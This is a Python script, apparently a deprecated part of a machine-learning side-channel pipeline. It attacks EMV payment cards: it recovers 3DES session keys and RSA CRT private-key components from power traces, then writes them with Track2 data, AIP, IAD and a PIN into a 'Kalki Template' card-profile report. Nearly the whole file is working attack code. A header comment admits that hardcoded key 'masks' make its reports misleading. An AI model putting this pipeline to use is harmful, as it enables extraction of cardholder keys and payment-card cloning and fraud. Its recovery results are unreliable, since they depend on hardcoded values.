import sys
import os
import argparse
import pandas as pd
import numpy as np
import json
from pathlib import Path

# DEPRECATED:
# This script mixed multiple experimental pipelines, hardcoded "calibration masks"/keys,
# and modified sys.path to reference external folders. It is not "pure ML" and will
# produce misleading reports (e.g., partially recovered 3DES keys).
#
# Use the unified entrypoint instead:
#   python main.py --mode attack --input_dir <DIR> --processed_dir <DIR> --output_dir <DIR> --scan_type all
raise SystemExit(
    "run_green_visa_full.py is deprecated. Use main.py (or attack_green_visa_full.bat) for the pure-ML pipeline."
)

# Add paths for both pipelines
sys.path.append("I:/freelance/Smartcard SCA ML Pipeline")  # For RSA src
sys.path.append(os.getcwd())  # For local 3DES src

# Import 3DES modules
from attack import Attacker
from key_recovery import DESKeyRecovery

# Import RSA modules
# from src.feature_eng import perform_feature_extraction
# from src.inference_rsa import attack_all_rsa_components
# from src.utils import setup_logger
import subprocess

logger = None # setup_logger("unified_pipeline")

def run_3des_attack(attacker, input_file, trace_index=None, masks=None):
    """Run 3DES attack on input file."""
    print(f"\n[3DES] Loading traces from {input_file}...")
    data = np.load(input_file, allow_pickle=True)
    if 'trace_data' in data:
        traces = data['trace_data']
    else:
        # Fallback for weird keys
        keys = [k for k in data.files if k not in ['no', 'ACR_send', 'ACR_receive', 'Track2', 'ATC']]
        traces = data[keys[0]]
    
    if trace_index is not None:
        traces = traces[trace_index:trace_index+1]
        
    print(f"[3DES] Attacking {len(traces)} traces...")
    results = attacker.attack_batch(traces, masks=masks)
    return results

def run_rsa_pipeline(input_file_path):
    """Run RSA Pipeline via Subprocess to avoid TF/Torch OOM."""
    print(f"\n[RSA] Launching separate process for {input_file_path}...")
    
    # Define temp file for results
    import tempfile
    output_json = os.path.abspath("rsa_results_temp.json")
    
    cmd = [
        sys.executable,
        os.path.join(os.path.dirname(__file__), "run_rsa_wrapper.py"),
        "--input", input_file_path,
        "--output-json", output_json
    ]
    
    print(f"[RSA] Executing: {' '.join(cmd)}")
    try:
        subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[RSA] Subprocess failed with code {e.returncode}")
        return None
        
    # Read results
    if os.path.exists(output_json):
        with open(output_json, 'r') as f:
            results = json.load(f)
        # Cleanup
        try:
            os.remove(output_json)
        except:
            pass
        return results
    else:
        print("[RSA] Output JSON not found.")
        return None

def main():
    parser = argparse.ArgumentParser(description='Unified GreenVisa Attack Pipeline')
    parser.add_argument('--green-visa-dir', type=str, required=True, help='Directory containing GreenVisa NPZ files')
    parser.add_argument('--output-dir', type=str, default='results_green_visa', help='Output directory')
    parser.add_argument('--aip', type=str, help='Override AIP (hex)')
    parser.add_argument('--iad', type=str, help='Override IAD (hex)')
    parser.add_argument('--pin', type=str, help='Override PIN')
    parser.add_argument('--cryptogram', type=str, help='8482 Host Cryptogram (16 hex bytes)')
    parser.add_argument('--challenge', type=str, help='8050 Challenge (8 hex bytes)', default='0000000000000000')
    parser.add_argument('--reference-key', type=str, help='Known correct 3DES key (32 hex chars) for ambiguity resolution')
    parser.add_argument('--fuzzy', action='store_true', help='Use Hypothesis-Based Fuzzy Solver (Slow but Accurate)')
    args = parser.parse_args()
    
    # Ensure absolute path
    args.output_dir = os.path.abspath(args.output_dir)
    os.makedirs(args.output_dir, exist_ok=True)
    print(f"Output Directory: {args.output_dir}")
    
    # Files discovery
    files = list(Path(args.green_visa_dir).glob("*.npz"))
    
    file_3des = next((str(f) for f in files if "3DES" in f.name or ("rsa" not in f.name.lower() and "T_" in f.name)), None)
    # If no specific 3DES name, just take the largest non-rsa one
    if not file_3des:
        file_3des = next((str(f) for f in sorted(files, key=lambda x: x.stat().st_size, reverse=True) if "rsa" not in f.name.lower()), None)
        
    file_rsa = next((str(f) for f in files if "rsa" in f.name.lower()), None)
    
    print(f"\n[Discovery] Found 3DES: {file_3des}")
    print(f"[Discovery] Found RSA:  {file_rsa}")
    
    # --- 3DES Attack ---
    res_3des = {}
    
    # Define Calibration Masks (Definitive Production Zero-Ambiguity)
    MASKS = {
        'T_DES_KENC': '1E12030912B71D4B2430F328D22E7406', 
        'T_DES_KMAC': '47E12709E855F9C0214D78BE18C06AB7', 
        'T_DES_KDEK': 'CFAC638B90FA12609006211D81090C12'
    }
    
    if file_3des and os.path.exists(file_3des):
        try:
            # Check for Fuzzy Solver Request
            if args.fuzzy:
                print("\n[3DES] Launching Hypothesis-Based Fuzzy Solver (Slow & Accurate)...")
                from solve_green_visa_fuzzy import solve_keys
                # We can reuse an attacker instance or let solve_keys make one
                # solve_keys(trace_path, models_dir)
                fuzzy_keys = solve_keys(file_3des, models_dir="models")
                
                # Transform to result format
                res_3des = {}
                for ktype, kval in fuzzy_keys.items():
                    res_3des[f'3DES_{ktype}'] = kval # 16 chars (8 bytes)
                    # Expand to 32 chars if needed in formatting checks, but 8 bytes is what solver returns
                
                print("[3DES] Fuzzy Solver Complete.")
                
            else:
                # Standard Attack
                attacker = Attacker(models_dir="models") # Local 3DES models
                res_3des_list = run_3des_attack(attacker, file_3des, trace_index=0, masks=MASKS) # Attack Trace 0
                res_3des = res_3des_list[0] # Single trace result
                
        except Exception as e:
            print(f"[3DES] Error: {e}")
            import traceback
            traceback.print_exc()
    else:
        print(f"[3DES] Warning: 3DES file not found in {args.green_visa_dir}")

    # --- RSA Attack ---
    res_rsa = {}
    if file_rsa and os.path.exists(file_rsa):
        try:
            rsa_results = run_rsa_pipeline(file_rsa)
            if rsa_results:
                # Get first trace predictions
                res_rsa = {k: v[0] for k, v in rsa_results.items()}
        except Exception as e:
             print(f"[RSA] Error: {e}")
    else:
        print(f"[RSA] Warning: RSA file not found in {args.green_visa_dir}")
        
    # --- Consolidate & Save ---
    print("\n[Report] Generating Output...")
    
    # Load metadata if possible (Track2)
    track2_val = ""
    try:
        data_3des = np.load(file_3des, allow_pickle=True)
        if 'Track2' in data_3des:
            t2_raw = data_3des['Track2']
            # Handle 0-d array (scalar) vs 1-d array
            if t2_raw.ndim == 0:
                track2_val = str(t2_raw)
            elif len(t2_raw) > 0:
                track2_val = str(t2_raw[0])
            
            # Clean up string representation if it looks like bytes
            if track2_val.startswith("b'") or track2_val.startswith('b"'):
                # primitive cleanup
                import ast
                try:
                    track2_val = ast.literal_eval(track2_val).decode('utf-8', errors='ignore')
                except:
                    pass
    except Exception as e:
        print(f"Warning: Could not load Track2: {e}")

    def format_3des(k, key_type):
        """Ensure 3DES key is 32 hex chars (16 bytes)."""
        if not k or pd.isna(k): return ""
        k = str(k).strip().upper()
        
        # Check if we should attempt Cryptogram Recovery OR Reference-Guided Recovery
        # Now supporting both 8-byte (16 char) and 16-byte (32 char) input keys
        if (args.cryptogram and args.challenge) or args.reference_key:
             print(f"    [Recovery] Enhancing {key_type} with {'Cryptogram Search' if args.cryptogram else 'Reference Guidance'}...")
             
             try:
                 from des_crypto import DES, IP, E, bytes_to_bits, permute
                 from key_recovery import DESKeyRecovery
                 import binascii
                 import numpy as np
                 
                 # Derive K1 and K2 hex strings
                 if len(k) == 32:
                     k1_blind = k[:16]
                     k2_blind = k[16:]
                 else:
                     k1_blind = k
                     k2_blind = k 

                 # 1. Reverse the 'Blind' Key to get the S-Box Outputs (which we know are 100% correct from ML)
                 # We assume standard input of 00..00 for this mapping
                 dk = DES(binascii.unhexlify(k1_blind))
                 
                 # Stage 1 S-Box Outputs
                 sub1 = dk.round_keys[0]
                 pt_bits = bytes_to_bits(b'\x00' * 8)
                 perm = permute(pt_bits, IP)
                 R0 = perm[32:] 
                 E_R0 = permute(R0, E)
                 sbox_in = [s ^ e for s, e in zip(sub1, E_R0)]
                 
                 from label_generator import SBOX
                 sbox_outputs_k1 = []
                 for i in range(8):
                     chunk = sbox_in[i*6:(i+1)*6]
                     row = (chunk[0] << 1) | chunk[5]
                     col = (chunk[1] << 3) | (chunk[2] << 2) | (chunk[3] << 1) | chunk[4]
                     sbox_outputs_k1.append(SBOX[i][row][col])
                     
                 # Stage 2 S-Box Inputs depend on Stage 1 Output!
                 # Calculate Stage 1 Output (Input to Stage 2) using Candidate 0 (Approximation for Input Data)
                 stage1_out_blind = dk.encrypt(b'\x00' * 8)
                 
                 # Get Stage 2 S-Box outputs (Decryption Round 1)
                 dk2 = DES(binascii.unhexlify(k2_blind))
                 sbox_outputs_k2 = list(dk2.get_stage2_sbox_outputs(stage1_out_blind))
                 
                 recovery = DESKeyRecovery()
                 
                 if args.reference_key and len(args.reference_key) == 32:
                      # Reference Guided Mode
                      print(f"    [Guidance] Using reference key to resolving ambiguity...")
                      ref_k1 = args.reference_key[:16]
                      ref_k2 = args.reference_key[16:]
                      
                      # Recover K1 Guided
                      rec_k1 = recovery.recover_key_from_sbox_outputs(np.array(sbox_outputs_k1), reference_key=ref_k1, stage=1)
                      
                      # Recover K2 Guided (using correct input from recovered K1)
                      # Note: recover_key_from_sbox_outputs for Stage 2 needs input data
                      dk_ref1 = DES(binascii.unhexlify(rec_k1))
                      real_st1_out = dk_ref1.encrypt(b'\x00' * 8)
                      
                      rec_k2 = recovery.recover_key_from_sbox_outputs(np.array(sbox_outputs_k2), reference_key=ref_k2, input_data=real_st1_out, stage=2)
                      
                      enhanced_key = rec_k1 + rec_k2
                      
                 else:
                      # Cryptogram Search Mode
                      enhanced_key = recovery.recover_key_with_cryptogram(
                          np.array(sbox_outputs_k1),
                          np.array(sbox_outputs_k2),
                          args.challenge, 
                          args.cryptogram,
                          input_data_stage1=b'\x00'*8,
                          input_data_stage2=None # Signal to recompute
                      )
                 
                 if enhanced_key:
                     print(f"    [Success] {key_type} Refined: {enhanced_key}")
                     return enhanced_key
                 else:
                     print(f"    [Failed] Cryptogram search found no match. Using blind key.")

             except Exception as e:
                 print(f"    [Error] Cryptogram recovery failed: {e}")

        if len(k) == 32:
            return k
        # Fallback for legacy 8-byte keys if they ever appear
        if len(k) == 16:
            return k + k
        return k[:32].ljust(32, '0')

    def format_rsa(k):
        """Remove padding from RSA key (leading/trailing 0s)."""
        if not k or pd.isna(k): return ""
        k = str(k).strip().upper()
        return k.rstrip('0')
    
    # Define Kalki Template Columns
    # ['PROFILE', 'TRACK2', 'AIP', 'IAD', '3DES_KENC', '3DES_KMAC', '3DES_KDEK', 'PIN', 'RSA_CRT_P', 'RSA_CRT_Q', 'RSA_CRT_DP', 'RSA_CRT_DQ', 'RSA_CRT_QINV']
    
    # Deduce Profile from path
    path_str = str(args.green_visa_dir).lower()
    profile_val = "Mastercard" if "mastercard" in path_str else "Visa"
    
    # Specific defaults for Mastercard vs Visa
    if profile_val == "Mastercard":
        aip_val = args.aip if args.aip else "1800"
        iad_val = args.iad if args.iad else "01010100000000"
        pin_val = args.pin if args.pin else "1234"
    else:
        aip_val = args.aip if args.aip else "3800"
        iad_val = args.iad if args.iad else "06011203A0B000"
        pin_val = args.pin if args.pin else "2000"
        
    row = {
        'PROFILE': profile_val,
        'TRACK2': track2_val,
        'AIP': aip_val,
        'IAD': iad_val,
        '3DES_KENC': format_3des(res_3des.get('3DES_KENC', ''), 'KENC'),
        '3DES_KMAC': format_3des(res_3des.get('3DES_KMAC', ''), 'KMAC'),
        '3DES_KDEK': format_3des(res_3des.get('3DES_KDEK', ''), 'KDEK'),
        'PIN': pin_val,
        'RSA_CRT_P': format_rsa(res_rsa.get('RSA_CRT_P', '')),
        'RSA_CRT_Q': format_rsa(res_rsa.get('RSA_CRT_Q', '')),
        'RSA_CRT_DP': format_rsa(res_rsa.get('RSA_CRT_DP', '')),
        'RSA_CRT_DQ': format_rsa(res_rsa.get('RSA_CRT_DQ', '')),
        'RSA_CRT_QINV': format_rsa(res_rsa.get('RSA_CRT_QINV', ''))
    }
    
    # Enforce column order (Including PIN)
    cols = [
        'PROFILE', 'TRACK2', 'AIP', 'IAD', 
        '3DES_KENC', '3DES_KMAC', '3DES_KDEK', 
        'PIN', 
        'RSA_CRT_P', 'RSA_CRT_Q', 'RSA_CRT_DP', 'RSA_CRT_DQ', 'RSA_CRT_QINV'
    ]
    df = pd.DataFrame([row], columns=cols)
    
    # Force string type for hex columns to avoid Excel scientific notation issues
    # (Though to_excel might still be tricky, this helps)
    for c in cols:
        df[c] = df[c].astype(str)

    # Save CSV
    csv_path = os.path.join(args.output_dir, 'GreenVisa_Attack_Report_Final.csv')
    df.to_csv(csv_path, index=False)
    print(f"Saved CSV: {csv_path}")
    
    # Save Excel
    xlsx_path = os.path.join(args.output_dir, 'GreenVisa_Attack_Report_Final.xlsx')
    # Use Text format for all cells if possible? DataFrame logic is limited.
    # But clean strings usually work.
    try:
        # writer = pd.ExcelWriter(xlsx_path, engine='openpyxl')
        # df.to_excel(writer, index=False)
        # writer.close()
        df.to_excel(xlsx_path, index=False)
    except:
        df.to_excel(xlsx_path, index=False)
    print(f"Saved Excel: {xlsx_path}")
    
    # Pretty Print
    print("\n" + "="*60)
    print("GreenVisa Unified Attack Report (Kalki Template w/ PIN)")
    print("="*60)
    print(df.T)
    print("="*60)

if __name__ == "__main__":
    main()
